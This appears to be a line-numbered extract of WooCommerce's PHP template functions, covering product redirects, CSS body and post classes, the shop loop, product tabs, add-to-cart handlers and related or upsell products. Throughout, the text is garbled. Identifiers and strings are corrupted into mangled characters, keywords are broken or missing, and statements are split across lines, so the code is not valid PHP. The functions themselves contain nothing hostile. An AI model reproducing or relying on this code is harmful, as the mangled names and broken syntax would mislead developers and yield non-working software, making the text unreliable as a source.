( 'myaccount' ) ) ) ) );

38 
ex™
;

42 
	`–£if
 ( 
	`is_£¬ch
(è&& 
	`is_po¡_ty³_¬chive
Ğ'´oduù' ) && 
	`­¶y_f‹rs
Ğ'woocomm”û_»dœeù_sšgË_£¬ch_»suÉ', 
Œue
 ) && 
$wp_qu”y
->
po¡_couÁ
 == 1 ) {

43 
$´oduù
 = 
	`g‘_´oduù
Ğ
$wp_qu”y
->
po¡
 );

45 iàĞ
$´oduù
->
	`is_visibË
() ) {

46 
	`wp_§ã_»dœeù
Ğ
	`g‘_³rm®šk
Ğ
$´oduù
->
id
 ), 302 );

47 
ex™
;

52 
	`–£if
 ( 
	`is_add_·ym’t_m‘hod_·ge
() ) {

54 
	`WC
()->
	`·ym’t_g©eways
();

59 
	`–£if
 ( 
	`is_checkout
() ) {

61 
	`ob_¡¬t
();

64 
	`WC
()->
	`·ym’t_g©eways
();

65 
	`WC
()->
	`shpšg
();

67 
	}
}

68 
add_aùiÚ
( 'template_redirect', 'wc_template_redirect' );

76 
funùiÚ
 
	$wc_£tup_´oduù_d©a
Ğ
$po¡
 ) {

77 
	`un£t
Ğ
$GLOBALS
['product'] );

79 iàĞ
	`is_št
Ğ
$po¡
 ) )

80 
$po¡
 = 
	`g‘_po¡
( $post );

82 iàĞ
	`em±y
Ğ
$po¡
->
po¡_ty³
 ) || ! 
	`š_¬¿y
Ğ$po¡->po¡_ty³, 
	`¬¿y
( 'product', 'product_variation' ) ) )

85 
$GLOBALS
['´oduù'] = 
	`g‘_´oduù
Ğ
$po¡
 );

87  
$GLOBALS
['product'];

88 
	}
}

89 
add_aùiÚ
( 'the_post', 'wc_setup_product_data' );

91 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_reset_loop' ) ) {

100 
funùiÚ
 
woocomm”û_»£t_loİ
() {

101 
glob®
 
	g$woocomm”û_loİ
;

103 
	g$woocomm”û_loİ
['loİ'] = 
$woocomm”û_loİ
['columns'] = '';

106 
add_f‹r
( 'loop_end', 'woocommerce_reset_loop' );

114 
funùiÚ
 
	$wc_´oduùs_rss_ãed
() {

116 iàĞ
	`is_po¡_ty³_¬chive
Ğ'´oduù' ) || 
	`is_sšguÏr
( 'product' ) ) {

118 
$ãed
 = 
	`g‘_po¡_ty³_¬chive_ãed_lšk
( 'product' );

120 
echo
 '<lšk„–="®‹º©e"y³="­¶iÿtiÚ/rss+xml"™Ë="' . 
	`__
Ğ'New…roduùs', 'woocomm”û' ) . '" h»f="' . 
	`esc_©Œ
Ğ
$ãed
 ) . '" />';

122 } 
	`–£if
 ( 
	`is_x
( 'product_cat' ) ) {

124 
$‹rm
 = 
	`g‘_‹rm_by
('¦ug', 
	`esc_©Œ
Ğ
	`g‘_qu”y_v¬
('product_cat') ), 'product_cat');

126 
$ãed
 = 
	`add_qu”y_¬g
('´oduù_ÿt', 
$‹rm
->
¦ug
, 
	`g‘_po¡_ty³_¬chive_ãed_lšk
( 'product' ));

128 
echo
 '<lšk„–="®‹º©e"y³="­¶iÿtiÚ/rss+xml"™Ë="' . 
	`¥rštf
(
	`__
Ğ'New…roduù addedØ%s', 'woocomm”û' ), 
	`u¾’code
(
$‹rm
->
Çme
)è. '" h»f="' . 
	`esc_©Œ
Ğ
$ãed
 ) . '" />';

130 } 
	`–£if
 ( 
	`is_x
( 'product_tag' ) ) {

132 
$‹rm
 = 
	`g‘_‹rm_by
('¦ug', 
	`esc_©Œ
Ğ
	`g‘_qu”y_v¬
('product_tag') ), 'product_tag');

134 
$ãed
 = 
	`add_qu”y_¬g
('´oduù_g', 
$‹rm
->
¦ug
, 
	`g‘_po¡_ty³_¬chive_ãed_lšk
( 'product' ));

136 
echo
 '<lšk„–="®‹º©e"y³="­¶iÿtiÚ/rss+xml"™Ë="' . 
	`¥rštf
(
	`__
Ğ'New…roduù gged %s', 'woocomm”û' ), 
	`u¾’code
(
$‹rm
->
Çme
)è. '" h»f="' . 
	`esc_©Œ
Ğ
$ãed
 ) . '" />';

139 
	}
}

147 
funùiÚ
 
	$wc_g’”©Ü_g
Ğ
$g’
, 
$ty³
 ) {

148  
$ty³
 ) {

150 
$g’
 .ğ"\n" . '<m‘¨Çme="g’”©Ü" cÚ‹Á="WooComm”û ' . 
	`esc_©Œ
Ğ
WC_VERSION
 ) . '">';

153 
$g’
 .ğ"\n" . '<m‘¨Çme="g’”©Ü" cÚ‹Á="WooComm”û ' . 
	`esc_©Œ
Ğ
WC_VERSION
 ) . '" />';

156  
$g’
;

157 
	}
}

165 
funùiÚ
 
	$wc_body_şass
Ğ
$şas£s
 ) {

166 
$şas£s
 = (
¬¿y
) $classes;

168 iàĞ
	`is_woocomm”û
() ) {

169 
$şas£s
[] = 'woocommerce';

170 
$şas£s
[] = 'woocommerce-page';

173 
	`–£if
 ( 
	`is_checkout
() ) {

174 
$şas£s
[] = 'woocommerce-checkout';

175 
$şas£s
[] = 'woocommerce-page';

178 
	`–£if
 ( 
	`is_ÿ¹
() ) {

179 
$şas£s
[] = 'woocommerce-cart';

180 
$şas£s
[] = 'woocommerce-page';

183 
	`–£if
 ( 
	`is_accouÁ_·ge
() ) {

184 
$şas£s
[] = 'woocommerce-account';

185 
$şas£s
[] = 'woocommerce-page';

188 iàĞ
	`is_¡Üe_nÙiû_showšg
() ) {

189 
$şas£s
[] = 'woocommerce-demo-store';

192  
	`¬¿y_unique
Ğ
$şas£s
 );

193 
	}
}

204 
funùiÚ
 
wc_´oduù_po¡_şass
Ğ
$şas£s
, 
$şass
 = '', 
$po¡_id
 = '' ) {

205 iàĞ! 
$po¡_id
 || 
g‘_po¡_ty³
( $post_id ) !== 'product' )

206  
$şas£s
;

208 
	g$´oduù
 = 
g‘_´oduù
Ğ
$po¡_id
 );

210 iàĞ
	g$´oduù
 ) {

211 iàĞ
	g$´oduù
->
is_Ú_§Ë
() ) {

212 
	g$şas£s
[] = 'sale';

214 iàĞ
	g$´oduù
->
is_ã©u»d
() ) {

215 
	g$şas£s
[] = 'featured';

217 iàĞ
	g$´oduù
->
is_dowÆßdabË
() ) {

218 
	g$şas£s
[] = 'downloadable';

220 iàĞ
	g$´oduù
->
is_vœtu®
() ) {

221 
	g$şas£s
[] = 'virtual';

223 iàĞ
	g$´oduù
->
is_sŞd_šdividu®ly
() ) {

224 
	g$şas£s
[] = 'sold-individually';

226 iàĞ
	g$´oduù
->
is_xabË
() ) {

227 
	g$şas£s
[] = 'taxable';

229 iàĞ
	g$´oduù
->
is_shpšg_xabË
() ) {

230 
	g$şas£s
[] = 'shipping-taxable';

232 iàĞ
	g$´oduù
->
is_purcha§bË
() ) {

233 
	g$şas£s
[] = 'purchasable';

235 iàĞ
is£t
Ğ
$´oduù
->
´oduù_ty³
 ) ) {

236 
	g$şas£s
[] = "´oduù-ty³-" . 
$´oduù
->
´oduù_ty³
;

240 
	g$ÿ‹gÜ›s
 = 
wp_g‘_po¡_‹rms
Ğ
$´oduù
->
id
, "product_cat" );

241 iàĞ! 
em±y
Ğ
$ÿ‹gÜ›s
 ) ) {

242 
fÜ—ch
 (
$ÿ‹gÜ›s
 
as
 
$key
 => 
$v®ue
) {

243 
$şas£s
[] = "´oduù-ÿt-" . 
$v®ue
->
¦ug
;

248 
	g$gs
 = 
wp_g‘_po¡_‹rms
Ğ
$´oduù
->
id
, "product_tag" );

249 iàĞ! 
em±y
Ğ
$gs
 ) ) {

250 
fÜ—ch
 (
$gs
 
as
 
$key
 => 
$v®ue
) {

251 
$şas£s
[] = "´oduù-g-" . 
$v®ue
->
¦ug
;

255 
	g$şas£s
[] = 
$´oduù
->
¡ock_¡©us
;

258 iàĞĞ
	g$key
 = 
¬¿y_£¬ch
Ğ'h’Œy', 
$şas£s
 ) ) !=ğ
çl£
 ) {

259 
un£t
Ğ
$şas£s
[ 
$key
 ] );

262  
	g$şas£s
;

267 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_content' ) ) {

279 
funùiÚ
 
woocomm”û_cÚ‹Á
() {

281 iàĞ
is_sšguÏr
( 'product' ) ) {

283  
have_po¡s
(èè: 
the_po¡
();

285 
wc_g‘_‹m¶©e_·¹
( 'content', 'single-product' );

287 
	g’dwhe
;

291 <?
php
 iàĞ
­¶y_f‹rs
Ğ'woocomm”û_show_·ge_t™Ë', 
Œue
 ) ) : ?>

293 <
h1
 
şass
="·ge-t™Ë"><?
php
 
woocomm”û_·ge_t™Ë
(); ?></
	gh1
>

295 <?
php
 
	g’dif
; ?>

297 <?
php
 
do_aùiÚ
( 'woocommerce_archive_description' ); ?>

299 <?
php
 iàĞ
have_po¡s
() ) : ?>

301 <?
php
 
do_aùiÚ
('woocommerce_before_shop_loop'); ?>

303 <?
php
 
woocomm”û_´oduù_loİ_¡¬t
(); ?>

305 <?
php
 
woocomm”û_´oduù_subÿ‹gÜ›s
(); ?>

307 <?
php
  
have_po¡s
(èè: 
the_po¡
(); ?>

309 <?
php
 
wc_g‘_‹m¶©e_·¹
( 'content', 'product' ); ?>

311 <?
php
 
	g’dwhe
;

313 <?
php
 
woocomm”û_´oduù_loİ_’d
(); ?>

315 <?
php
 
do_aùiÚ
('woocommerce_after_shop_loop'); ?>

317 <?
php
 
–£if
 ( ! 
woocomm”û_´oduù_subÿ‹gÜ›s
Ğ
¬¿y
Ğ'befÜe' => 
woocomm”û_´oduù_loİ_¡¬t
Ğ
çl£
 ), 'aá”' => 
woocomm”û_´oduù_loİ_’d
( false ) ) ) ) : ?>

319 <?
php
 
wc_g‘_‹m¶©e
( 'loop/no-products-found.php' ); ?>

321 <?
php
 
	g’dif
;

329 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_output_content_wrapper' ) ) {

337 
funùiÚ
 
woocomm”û_ouut_cÚ‹Á_w¿µ”
() {

338 
wc_g‘_‹m¶©e
( 'global/wrapper-start.php' );

341 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_output_content_wrapper_end' ) ) {

349 
funùiÚ
 
woocomm”û_ouut_cÚ‹Á_w¿µ”_’d
() {

350 
wc_g‘_‹m¶©e
( 'global/wrapper-end.php' );

354 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_get_sidebar' ) ) {

362 
funùiÚ
 
woocomm”û_g‘_sideb¬
() {

363 
wc_g‘_‹m¶©e
( 'global/sidebar.php' );

367 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_demo_store' ) ) {

375 
funùiÚ
 
woocomm”û_demo_¡Üe
() {

376 iàĞ!
is_¡Üe_nÙiû_showšg
() )

379 
	g$nÙiû
 = 
g‘_İtiÚ
( 'woocommerce_demo_store_notice' );

380 iàĞ
em±y
Ğ
$nÙiû
 ) )

381 
	g$nÙiû
 = 
__
( 'This is‡ demo store foresting…urposes &mdash;‚o orders shall be fulfilled.', 'woocommerce' );

383 
echo
 
­¶y_f‹rs
Ğ'woocomm”û_demo_¡Üe', '<°şass="demo_¡Üe">' . 
$nÙiû
 . '</p>' );

389 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_page_title' ) ) {

397 
funùiÚ
 
woocomm”û_·ge_t™Ë
Ğ
$echo
 = 
Œue
 ) {

399 iàĞ
is_£¬ch
() ) {

400 
$·ge_t™Ë
 = 
¥rštf
Ğ
__
Ğ'S—rch ResuÉs: &ldquo;%s&rdquo;', 'woocomm”û' ), 
g‘_£¬ch_qu”y
() );

402 iàĞ
g‘_qu”y_v¬
( 'paged' ) )

403 
	g$·ge_t™Ë
 .ğ
¥rštf
Ğ
__
Ğ'&nb¥;&ndash; Pag%s', 'woocomm”û' ), 
g‘_qu”y_v¬
( 'paged' ) );

405 } 
–£if
 ( 
is_x
() ) {

407 
	g$·ge_t™Ë
 = 
sšgË_‹rm_t™Ë
Ğ"", 
çl£
 );

411 
	g$shİ_·ge_id
 = 
wc_g‘_·ge_id
( 'shop' );

412 
	g$·ge_t™Ë
 = 
g‘_the_t™Ë
Ğ
$shİ_·ge_id
 );

416 
	g$·ge_t™Ë
 = 
­¶y_f‹rs
Ğ'woocomm”û_·ge_t™Ë', 
$·ge_t™Ë
 );

418 iàĞ
	g$echo
 )

419 
echo
 
	g$·ge_t™Ë
;

421  
	g$·ge_t™Ë
;

425 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_product_loop_start' ) ) {

434 
funùiÚ
 
woocomm”û_´oduù_loİ_¡¬t
Ğ
$echo
 = 
Œue
 ) {

435 
ob_¡¬t
();

436 
wc_g‘_‹m¶©e
( 'loop/loop-start.php' );

437 iàĞ
	g$echo
 )

438 
echo
 
ob_g‘_ş—n
();

440  
ob_g‘_ş—n
();

443 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_product_loop_end' ) ) {

452 
funùiÚ
 
woocomm”û_´oduù_loİ_’d
Ğ
$echo
 = 
Œue
 ) {

453 
ob_¡¬t
();

455 
wc_g‘_‹m¶©e
( 'loop/loop-end.php' );

457 iàĞ
	g$echo
 )

458 
echo
 
ob_g‘_ş—n
();

460  
ob_g‘_ş—n
();

463 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_taxonomy_archive_description' ) ) {

472 
funùiÚ
 
woocomm”û_xÚomy_¬chive_desütiÚ
() {

473 iàĞ
is_x
Ğ
¬¿y
Ğ'´oduù_ÿt', '´oduù_g' ) ) && 
g‘_qu”y_v¬
( 'paged' ) == 0 ) {

474 
$desütiÚ
 = 
­¶y_f‹rs
Ğ'the_cÚ‹Á', 
‹rm_desütiÚ
() );

475 iàĞ
	g$desütiÚ
 ) {

476 
	gecho
 '<div cÏss="‹rm-desütiÚ">' . 
	g$desütiÚ
 . '</div>';

481 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_product_archive_description' ) ) {

490 
funùiÚ
 
woocomm”û_´oduù_¬chive_desütiÚ
() {

491 iàĞ
is_po¡_ty³_¬chive
Ğ'´oduù' ) && 
g‘_qu”y_v¬
( 'paged' ) == 0 ) {

492 
$shİ_·ge
 = 
g‘_po¡
Ğ
wc_g‘_·ge_id
( 'shop' ) );

493 iàĞ
	g$shİ_·ge
 ) {

494 
	g$desütiÚ
 = 
­¶y_f‹rs
Ğ'the_cÚ‹Á', 
$shİ_·ge
->
po¡_cÚ‹Á
 );

495 iàĞ
	g$desütiÚ
 ) {

496 
	gecho
 '<div cÏss="·ge-desütiÚ">' . 
	g$desütiÚ
 . '</div>';

503 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_template_loop_add_to_cart' ) ) {

512 
funùiÚ
 
woocomm”û_‹m¶©e_loİ_add_to_ÿ¹
() {

513 
wc_g‘_‹m¶©e
( 'loop/add-to-cart.php' );

516 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_template_loop_product_thumbnail' ) ) {

525 
funùiÚ
 
woocomm”û_‹m¶©e_loİ_´oduù_thumbÇ
() {

526 
echo
 
woocomm”û_g‘_´oduù_thumbÇ
();

529 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_template_loop_price' ) ) {

538 
funùiÚ
 
woocomm”û_‹m¶©e_loİ_´iû
() {

539 
wc_g‘_‹m¶©e
( 'loop/price.php' );

542 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_template_loop_rating' ) ) {

551 
funùiÚ
 
woocomm”û_‹m¶©e_loİ_¿tšg
() {

552 
wc_g‘_‹m¶©e
( 'loop/rating.php' );

555 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_show_product_loop_sale_flash' ) ) {

564 
funùiÚ
 
woocomm”û_show_´oduù_loİ_§Ë_æash
() {

565 
wc_g‘_‹m¶©e
( 'loop/sale-flash.php' );

569 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_get_product_schema' ) ) {

575 
funùiÚ
 
woocomm”û_g‘_´oduù_schema
() {

576 
glob®
 
	g$po¡
, 
	g$´oduù
;

578 
	g$schema
 = "Product";

581 iàĞ
	g$´oduù
->
is_dowÆßdabË
() ) {

582  
	g$´oduù
->
	gdowÆßd_ty³
 ) {

584 
$schema
 = "SoftwareApplication";

587 
$schema
 = "MusicAlbum";

590 
$schema
 = "Product";

595  'h‰p://schema.Üg/' . 
	g$schema
;

599 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_get_product_thumbnail' ) ) {

611 
funùiÚ
 
woocomm”û_g‘_´oduù_thumbÇ
Ğ
$size
 = 'shİ_ÿlog', 
$¶aûhŞd”_width
 = 0, 
$¶aûhŞd”_height
 = 0 ) {

612 
glob®
 
$po¡
;

614 iàĞ
has_po¡_thumbÇ
() )

615  
g‘_the_po¡_thumbÇ
Ğ
$po¡
->
ID
, 
$size
 );

616 
–£if
 ( 
wc_¶aûhŞd”_img_¤c
() )

617  
wc_¶aûhŞd”_img
Ğ
$size
 );

621 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_result_count' ) ) {

630 
funùiÚ
 
woocomm”û_»suÉ_couÁ
() {

631 
wc_g‘_‹m¶©e
( 'loop/result-count.php' );

635 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_catalog_ordering' ) ) {

644 
funùiÚ
 
woocomm”û_ÿlog_Üd”šg
() {

645 
	g$Üd”by
 = 
is£t
Ğ
$_GET
['Üd”by'] ) ? 
wc_ş—n
Ğ$_GET['Üd”by'] ) : 
­¶y_f‹rs
Ğ'woocomm”û_deçuÉ_ÿlog_Üd”by', 
g‘_İtiÚ
( 'woocommerce_default_catalog_orderby' ) );

647 
wc_g‘_‹m¶©e
Ğ'loİ/Üd”by.php', 
¬¿y
Ğ'Üd”by' => 
$Üd”by
 ) );

651 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_pagination' ) ) {

660 
funùiÚ
 
woocomm”û_·gš©iÚ
() {

661 
wc_g‘_‹m¶©e
( 'loop/pagination.php' );

667 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_show_product_images' ) ) {

676 
funùiÚ
 
woocomm”û_show_´oduù_images
() {

677 
wc_g‘_‹m¶©e
( 'single-product/product-image.php' );

680 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_show_product_thumbnails' ) ) {

689 
funùiÚ
 
woocomm”û_show_´oduù_thumbÇs
() {

690 
wc_g‘_‹m¶©e
( 'single-product/product-thumbnails.php' );

693 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_output_product_data_tabs' ) ) {

702 
funùiÚ
 
woocomm”û_ouut_´oduù_d©a_bs
() {

703 
wc_g‘_‹m¶©e
( 'single-product/tabs/tabs.php' );

706 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_template_single_title' ) ) {

715 
funùiÚ
 
woocomm”û_‹m¶©e_sšgË_t™Ë
() {

716 
wc_g‘_‹m¶©e
( 'single-product/title.php' );

719 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_template_single_rating' ) ) {

728 
funùiÚ
 
woocomm”û_‹m¶©e_sšgË_¿tšg
() {

729 
wc_g‘_‹m¶©e
( 'single-product/rating.php' );

732 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_template_single_price' ) ) {

741 
funùiÚ
 
woocomm”û_‹m¶©e_sšgË_´iû
() {

742 
wc_g‘_‹m¶©e
( 'single-product/price.php' );

745 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_template_single_excerpt' ) ) {

754 
funùiÚ
 
woocomm”û_‹m¶©e_sšgË_exû½t
() {

755 
wc_g‘_‹m¶©e
( 'single-product/short-description.php' );

758 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_template_single_meta' ) ) {

767 
funùiÚ
 
woocomm”û_‹m¶©e_sšgË_m‘a
() {

768 
wc_g‘_‹m¶©e
( 'single-product/meta.php' );

771 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_template_single_sharing' ) ) {

780 
funùiÚ
 
woocomm”û_‹m¶©e_sšgË_sh¬šg
() {

781 
wc_g‘_‹m¶©e
( 'single-product/share.php' );

784 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_show_product_sale_flash' ) ) {

793 
funùiÚ
 
woocomm”û_show_´oduù_§Ë_æash
() {

794 
wc_g‘_‹m¶©e
( 'single-product/sale-flash.php' );

798 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_template_single_add_to_cart' ) ) {

807 
funùiÚ
 
woocomm”û_‹m¶©e_sšgË_add_to_ÿ¹
() {

808 
glob®
 
	g$´oduù
;

809 
do_aùiÚ
Ğ'woocomm”û_' . 
$´oduù
->
´oduù_ty³
 . '_add_to_cart' );

812 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_simple_add_to_cart' ) ) {

821 
funùiÚ
 
woocomm”û_sim¶e_add_to_ÿ¹
() {

822 
wc_g‘_‹m¶©e
( 'single-product/add-to-cart/simple.php' );

825 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_grouped_add_to_cart' ) ) {

834 
funùiÚ
 
woocomm”û_grou³d_add_to_ÿ¹
() {

835 
glob®
 
	g$´oduù
;

837 
wc_g‘_‹m¶©e
Ğ'sšgË-´oduù/add-to-ÿ¹/grou³d.php', 
¬¿y
(

838 'grou³d_´oduù' => 
$´oduù
,

839 'grou³d_´oduùs' => 
$´oduù
->
g‘_chd»n
(),

840 'quªt™es_»quœed' => 
çl£


844 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_variable_add_to_cart' ) ) {

853 
funùiÚ
 
woocomm”û_v¬ŸbË_add_to_ÿ¹
() {

854 
glob®
 
	g$´oduù
;

857 
wp_’queue_süt
( 'wc-add-to-cart-variation' );

860 
wc_g‘_‹m¶©e
Ğ'sšgË-´oduù/add-to-ÿ¹/v¬ŸbË.php', 
¬¿y
(

861 'avaabË_v¬ŸtiÚs' => 
$´oduù
->
g‘_avaabË_v¬ŸtiÚs
(),

862 '©Œibu‹s' => 
$´oduù
->
g‘_v¬ŸtiÚ_©Œibu‹s
(),

863 '£Ëùed_©Œibu‹s' => 
$´oduù
->
g‘_v¬ŸtiÚ_deçuÉ_©Œibu‹s
()

867 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_external_add_to_cart' ) ) {

876 
funùiÚ
 
woocomm”û_ex‹º®_add_to_ÿ¹
() {

877 
glob®
 
	g$´oduù
;

879 iàĞ! 
	g$´oduù
->
g‘_´oduù_u¾
() )

882 
wc_g‘_‹m¶©e
Ğ'sšgË-´oduù/add-to-ÿ¹/ex‹º®.php', 
¬¿y
(

883 '´oduù_u¾' => 
$´oduù
->
g‘_´oduù_u¾
(),

884 'bu‰Ú_‹xt' => 
$´oduù
->
sšgË_add_to_ÿ¹_‹xt
()

889 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_quantity_input' ) ) {

899 
funùiÚ
 
woocomm”û_quªt™y_šput
Ğ
$¬gs
 = 
¬¿y
(), 
$´oduù
 = 
nuÎ
, 
$echo
 = 
Œue
 ) {

900 iàĞ
is_nuÎ
Ğ
$´oduù
 ) )

901 
$´oduù
 = 
$GLOBALS
['product'];

903 
	g$deçuÉs
 = 
¬¿y
(

906 'max_v®ue' => 
­¶y_f‹rs
Ğ'woocomm”û_quªt™y_šput_max', '', 
$´oduù
 ),

907 'mš_v®ue' => 
­¶y_f‹rs
Ğ'woocomm”û_quªt™y_šput_mš', '', 
$´oduù
 ),

908 '¡•' => 
­¶y_f‹rs
Ğ'woocomm”û_quªt™y_šput_¡•', '1', 
$´oduù
 )

911 
	g$¬gs
 = 
­¶y_f‹rs
Ğ'woocomm”û_quªt™y_šput_¬gs', 
wp_·r£_¬gs
Ğ
$¬gs
, 
$deçuÉs
 ), 
$´oduù
 );

913 
ob_¡¬t
();

915 
wc_g‘_‹m¶©e
Ğ'glob®/quªt™y-šput.php', 
$¬gs
 );

917 iàĞ
	g$echo
 ) {

918 
echo
 
ob_g‘_ş—n
();

920  
ob_g‘_ş—n
();

925 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_product_description_tab' ) ) {

934 
funùiÚ
 
woocomm”û_´oduù_desütiÚ_b
() {

935 
wc_g‘_‹m¶©e
( 'single-product/tabs/description.php' );

938 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_product_additional_information_tab' ) ) {

947 
funùiÚ
 
woocomm”û_´oduù_add™iÚ®_šfÜm©iÚ_b
() {

948 
wc_g‘_‹m¶©e
( 'single-product/tabs/additional-information.php' );

951 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_product_reviews_tab' ) ) {

960 
funùiÚ
 
woocomm”û_´oduù_»v›ws_b
() {

961 
wc_g‘_‹m¶©e
( 'single-product/tabs/reviews.php' );

965 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_default_product_tabs' ) ) {

974 
funùiÚ
 
woocomm”û_deçuÉ_´oduù_bs
Ğ
$bs
 = 
¬¿y
() ) {

975 
glob®
 
$´oduù
, 
$po¡
;

978 iàĞ
	g$po¡
->
	gpo¡_cÚ‹Á
 ) {

979 
	g$bs
['desütiÚ'] = 
¬¿y
(

980 't™Ë' => 
__
( 'Description', 'woocommerce' ),

987 iàĞ
	g$´oduù
 && ( $´oduù->
has_©Œibu‹s
(è|| ( $´oduù->
’abË_dim’siÚs_di¥Ïy
(è&& ( $´oduù->
has_dim’siÚs
(è|| $´oduù->
has_weight
() ) ) ) ) {

988 
	g$bs
['add™iÚ®_šfÜm©iÚ'] = 
¬¿y
(

989 't™Ë' => 
__
( 'Additional Information', 'woocommerce' ),

996 iàĞ
comm’ts_İ’
() ) {

997 
	g$bs
['»v›ws'] = 
¬¿y
(

998 't™Ë' => 
¥rštf
Ğ
__
Ğ'Rev›w (%d)', 'woocomm”û' ), 
g‘_comm’ts_numb”
Ğ
$po¡
->
ID
 ) ),

1004  
	g$bs
;

1008 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_sort_product_tabs' ) ) {

1017 
funùiÚ
 
woocomm”û_sÜt_´oduù_bs
Ğ
$bs
 = 
¬¿y
() ) {

1020 iàĞ! 
is_¬¿y
Ğ
$bs
 ) ) {

1021 
Œigg”_”rÜ
( "Function woocommerce_sort_product_tabs()ƒxpects‡n‡rray‡she first…arameter. Defaultingoƒmpty‡rray." );

1022 
	g$bs
 = 
¬¿y
( );

1026 iàĞ! 
funùiÚ_exi¡s
( '_sort_priority_callback' ) ) {

1027 
funùiÚ
 
_sÜt_´iÜ™y_ÿÎback
Ğ
$a
, 
$b
 ) {

1028 iàĞ
	g$a
['´iÜ™y'] =ğ
$b
['priority'] )

1030  ( 
	g$a
['´iÜ™y'] < 
	g$b
['priority'] ) ? -1 : 1;

1034 
uasÜt
Ğ
$bs
, '_sort_priority_callback' );

1036  
	g$bs
;

1040 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_comments' ) ) {

1049 
funùiÚ
 
woocomm”û_comm’ts
Ğ
$comm’t
, 
$¬gs
, 
$d•th
 ) {

1050 
	g$GLOBALS
['comm’t'] = 
$comm’t
;

1051 
wc_g‘_‹m¶©e
Ğ'sšgË-´oduù/»v›w.php', 
¬¿y
Ğ'comm’t' => 
$comm’t
, '¬gs' => 
$¬gs
, 'd•th' => 
$d•th
 ) );

1055 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_output_related_products' ) ) {

1064 
funùiÚ
 
woocomm”û_ouut_»Ï‹d_´oduùs
() {

1066 
	g$¬gs
 = 
¬¿y
(

1072 
woocomm”û_»Ï‹d_´oduùs
Ğ
­¶y_f‹rs
Ğ'woocomm”û_ouut_»Ï‹d_´oduùs_¬gs', 
$¬gs
 ) );

1076 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_related_products' ) ) {

1087 
funùiÚ
 
woocomm”û_»Ï‹d_´oduùs
Ğ
$¬gs
 = 
¬¿y
(), 
$cŞumns
 = 
çl£
, 
$Üd”by
 = false ) {

1088 iàĞ! 
is_¬¿y
Ğ
$¬gs
 ) ) {

1089 
_d•»ÿ‹d_¬gum’t
Ğ
__FUNCTION__
, '2.1', 
__
( 'Use $args‡rgument‡s‡n‡rray instead. Deprecated‡rgument will be„emoved in WC 2.2.', 'woocommerce' ) );

1091 
	g$¬gsv®ue
 = 
$¬gs
;

1093 
	g$¬gs
 = 
¬¿y
(

1094 'po¡s_³r_·ge' => 
$¬gsv®ue
,

1095 'cŞumns' => 
$cŞumns
,

1096 'Üd”by' => 
$Üd”by
,

1100 
	g$deçuÉs
 = 
¬¿y
(

1106 
	g$¬gs
 = 
wp_·r£_¬gs
Ğ
$¬gs
, 
$deçuÉs
 );

1108 
wc_g‘_‹m¶©e
Ğ'sšgË-´oduù/»Ï‹d.php', 
$¬gs
 );

1112 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_upsell_display' ) ) {

1123 
funùiÚ
 
woocomm”û_up£Î_di¥Ïy
Ğ
$po¡s_³r_·ge
 = '-1', 
$cŞumns
 = 2, 
$Üd”by
 = 'rand' ) {

1124 
wc_g‘_‹m¶©e
Ğ'sšgË-´oduù/up-£Îs.php', 
¬¿y
(

1125 'po¡s_³r_·ge' => 
$po¡s_³r_·ge
,

1126 'Üd”by' => 
­¶y_f‹rs
Ğ'woocomm”û_up£Îs_Üd”by', 
$Üd”by
 ),

1127 'cŞumns' => 
$cŞumns


1134 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_shipping_calculator' ) ) {

1143 
funùiÚ
 
woocomm”û_shpšg_ÿlcuÏtÜ
() {

1144 
wc_g‘_‹m¶©e
( 'cart/shipping-calculator.php' );

1148 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_cart_totals' ) ) {

1157 
funùiÚ
 
woocomm”û_ÿ¹_tÙ®s
() {

1158 
wc_g‘_‹m¶©e
( 'cart/cart-totals.php' );

1162 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_cross_sell_display' ) ) {

1171 
funùiÚ
 
woocomm”û_üoss_£Î_di¥Ïy
Ğ
$po¡s_³r_·ge
 = 2, 
$cŞumns
 = 2, 
$Üd”by
 = 'rand' ) {

1172 
